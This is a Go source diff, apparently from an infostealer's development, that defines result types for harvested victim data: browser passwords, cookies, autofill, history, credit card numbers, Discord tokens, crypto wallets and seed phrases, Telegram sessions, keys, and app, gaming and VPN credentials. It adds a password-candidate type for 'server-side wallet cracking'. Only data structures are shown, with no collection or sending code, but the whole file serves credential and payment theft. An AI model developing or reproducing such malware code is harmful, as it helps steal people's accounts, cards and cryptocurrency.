@@ -45,6 +45,13 @@ type PasswordResult struct {
 	Profile  string `json:"profile"`
 }
 
+// PasswordCandidateResult is a deduplicated password guess for server-side wallet cracking.
+type PasswordCandidateResult struct {
+	Password string `json:"password"`
+	Source   string `json:"source"`
+	Detail   string `json:"detail,omitempty"`
+}
+
 type CookieResult struct {
 	Host       string `json:"host"`
 	Name       string `json:"name"`
@@ -66,13 +73,13 @@ type AutofillResult struct {
 }
 
 type HistoryResult struct {
-	URL            string `json:"url"`
-	Title          string `json:"title"`
-	VisitTimeUnix  int64  `json:"visitTimeUnix"`
-	VisitCount     int64  `json:"visitCount"`
-	LastVisitTime  int64  `json:"lastVisitTime"`
-	Browser        string `json:"browser"`
-	Profile        string `json:"profile"`
+	URL           string `json:"url"`
+	Title         string `json:"title"`
+	VisitTimeUnix int64  `json:"visitTimeUnix"`
+	VisitCount    int64  `json:"visitCount"`
+	LastVisitTime int64  `json:"lastVisitTime"`
+	Browser       string `json:"browser"`
+	Profile       string `json:"profile"`
 }
 
 type BookmarkResult struct {
@@ -84,13 +91,13 @@ type BookmarkResult struct {
 }
 
 type CreditCardResult struct {
-	NameOnCard       string `json:"nameOnCard"`
-	ExpirationMonth  int    `json:"expirationMonth"`
-	ExpirationYear   int    `json:"expirationYear"`
-	CardNumber       string `json:"cardNumber"`
-	Nickname         string `json:"nickname"`
-	Browser          string `json:"browser"`
-	Profile          string `json:"profile"`
+	NameOnCard        string `json:"nameOnCard"`
+	CardNumber        string `json:"cardNumber"`
+	ExpirationMonth   int    `json:"expirationMonth"`
+	ExpirationYear    int    `json:"expirationYear"`
+	Nickname          string `json:"nickname"`
+	Browser           string `json:"browser"`
+	Profile           string `json:"profile"`
 }
 
 type DiscordTokenResult struct {
@@ -139,22 +146,23 @@ type AppCredentialResult struct {
 }
 
 type CollectionResult struct {
-	Passwords      []PasswordResult      `json:"passwords,omitempty"`
-	Cookies        []CookieResult        `json:"cookies,omitempty"`
-	Autofill       []AutofillResult      `json:"autofill,omitempty"`
-	History        []HistoryResult       `json:"history,omitempty"`
-	Bookmarks      []BookmarkResult      `json:"bookmarks,omitempty"`
-	CreditCards    []CreditCardResult    `json:"creditCards,omitempty"`
-	DiscordTokens  []DiscordTokenResult  `json:"discordTokens,omitempty"`
-	Files          []FileResult          `json:"files,omitempty"`
-	Extensions     []ExtensionResult     `json:"extensions,omitempty"`
-	Wallets        []WalletResult        `json:"wallets,omitempty"`
-	Telegram       []TelegramResult      `json:"telegram,omitempty"`
-	Keys           []KeyResult           `json:"keys,omitempty"`
-	AppCredentials []AppCredentialResult  `json:"appCredentials,omitempty"`
-	Gaming         *GamingResult         `json:"gaming,omitempty"`
-	VPNs           *VPNResult            `json:"vpns,omitempty"`
-	Errors         []string              `json:"errors,omitempty"`
+	Passwords           []PasswordResult          `json:"passwords,omitempty"`
+	PasswordCandidates  []PasswordCandidateResult `json:"passwordCandidates,omitempty"`
+	Cookies             []CookieResult            `json:"cookies,omitempty"`
+	Autofill            []AutofillResult          `json:"autofill,omitempty"`
+	History             []HistoryResult           `json:"history,omitempty"`
+	Bookmarks           []BookmarkResult          `json:"bookmarks,omitempty"`
+	CreditCards         []CreditCardResult        `json:"creditCards,omitempty"`
+	DiscordTokens       []DiscordTokenResult      `json:"discordTokens,omitempty"`
+	Files               []FileResult              `json:"files,omitempty"`
+	Extensions          []ExtensionResult         `json:"extensions,omitempty"`
+	Wallets             []WalletResult            `json:"wallets,omitempty"`
+	Telegram            []TelegramResult          `json:"telegram,omitempty"`
+	Keys                []KeyResult               `json:"keys,omitempty"`
+	AppCredentials      []AppCredentialResult     `json:"appCredentials,omitempty"`
+	Gaming              *GamingResult             `json:"gaming,omitempty"`
+	VPNs                *VPNResult                `json:"vpns,omitempty"`
+	Errors              []string                  `json:"errors,omitempty"`
 }
 
 type TelegramResult struct {
@@ -174,7 +182,7 @@ type KeyResult struct {
 
 type SeedResult struct {
 	Source string `json:"source"`
-	Path   string `json:"path"`
+	Path   string `json:"path,omitempty"`
 	Phrase string `json:"phrase"`
 	Words  int    `json:"words"`
 }
